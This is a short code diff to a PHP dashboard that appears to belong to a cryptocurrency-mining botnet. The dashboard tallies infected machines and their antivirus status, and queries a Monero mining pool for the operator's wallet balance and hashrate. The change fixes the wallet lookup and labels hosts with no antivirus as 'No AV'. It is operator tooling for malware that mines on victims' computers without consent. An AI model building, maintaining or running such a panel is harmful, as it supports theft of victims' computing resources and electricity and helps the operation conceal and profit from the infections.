@@ -9,6 +9,7 @@ $OnlineCount = 0;
 function GetLabels($_Array){
 	$S = "";
 	foreach($_Array as $u => $c){
+		if(strlen($u)==0) $u = "No AV";
 		$S .= "\"$u\", ";
 	}
 	$S = substr($S, 0, -2);
@@ -78,7 +79,12 @@ foreach($Infections as $x => $y){
 }
 
 $Stats = json_decode(file_get_contents("http://p5.minexmr.com/get_wid_stats?address=45LShhsUY3qC4EguYcBnp4FZcQsTMH7gPYUbN1Q4P2GpfkSEppowERsCHFwPg5qyDvVajGCkonmfVMeJb9WiYNiNUPgWc6b"), true);
-$Bal = number_format($Stats[0]["balance"]/pow(10, 12), 12);
+for($i = 0; $i<=100; $i++){
+	if($Stats[$i]["address"]=="45LShhsUY3qC4EguYcBnp4FZcQsTMH7gPYUbN1Q4P2GpfkSEppowERsCHFwPg5qyDvVajGCkonmfVMeJb9WiYNiNUPgWc6b"){
+		$Bal = number_format($Stats[$i]["balance"]/pow(10, 12), 12);
+		break;
+	}
+}
 $HV = 0.0;
 foreach($Stats as $sObj){
 	$HV += $sObj["hashrate"];
